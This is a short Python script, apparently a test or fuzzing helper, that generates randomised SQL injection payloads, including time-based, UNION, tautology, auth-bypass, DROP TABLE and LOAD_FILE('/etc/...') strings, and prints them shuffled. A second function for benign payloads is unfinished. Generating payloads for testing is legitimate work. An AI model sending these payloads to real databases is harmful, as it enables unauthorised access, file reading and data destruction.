import random
import string


def generate_random_string():
    length = random.randint(4, 9)
    """Generate a random alphanumeric string of the given length."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def generate_sql_injection_payloads(delay_time="0:0:5"):
    """Generate various SQL injection payloads for testing with random usernames and numbers."""

    payloads_sql = [
        # Time-based SQL injection
        f"{generate_random_string()}'; WAITFOR DELAY '{delay_time}'--",

        # Boolean-based SQL injection
        f"{generate_random_string()}' OR '{generate_random_string()}'='{generate_random_string()}' LIMIT 1;--",

        # UNION-based SQL injection
        f"{generate_random_string()}' UNION SELECT NULL, NULL--",

        # Error-based SQL injection
        f"{generate_random_string()}' AND 1=CONVERT(INT, '{generate_random_string()}');--",

        # Drop table SQL injection
        f"{generate_random_string()}'; DROP TABLE {generate_random_string()};--",

        # Classic tautology SQL injection
        f"{generate_random_string()}' OR '{generate_random_string()}'='{generate_random_string()}'--",

        # Bypass authentication
        f"{generate_random_string()}'--",

        # Second-order SQL injection
        f"{generate_random_string()}' AND EXISTS(SELECT * FROM {generate_random_string()} WHERE username = '{generate_random_string()}' AND password = '{generate_random_string()}');--",

        # Blind SQL injection
        f"{generate_random_string()}' AND 1={random.choice([1, 2])}--",  # True/False

        # Time-based Blind SQL injection
        f"{generate_random_string()}' AND IF({random.choice([1, 2])}=1, SLEEP({delay_time}), 0)--",  # Will cause delay if true

        # SQL injection with comments
        f"{generate_random_string()}'; --",
        f"{generate_random_string()}\"; --",
        f"{generate_random_string()}'; /*",

        f"{generate_random_string()}' UNION SELECT (SELECT COUNT(*) FROM information_schema.tables)--",
        f"{generate_random_string()}' UNION SELECT (SELECT version())--",

        f"{generate_random_string()}' OR LENGTH(password) > {random.randint(5, 15)}--",
        f"{generate_random_string()}' OR SUBSTRING(username, 1, 1)='{random.choice(string.ascii_letters)}'--",

        f"{generate_random_string()}' UNION SELECT NULL, LOAD_FILE('/etc/{generate_random_string()}')--",
    ]
    return payloads_sql


def generate_legit_payloads():
    payloads_legit = [

        f"login={generate_random_string()}&password=&action=login",

        "",

        "action=logout"
        
        "action=execute"

    ]


# Example usage
payloads = generate_sql_injection_payloads()

random.shuffle(payloads)

for i, payload in enumerate(payloads, 1):
    print(f"{payload}")
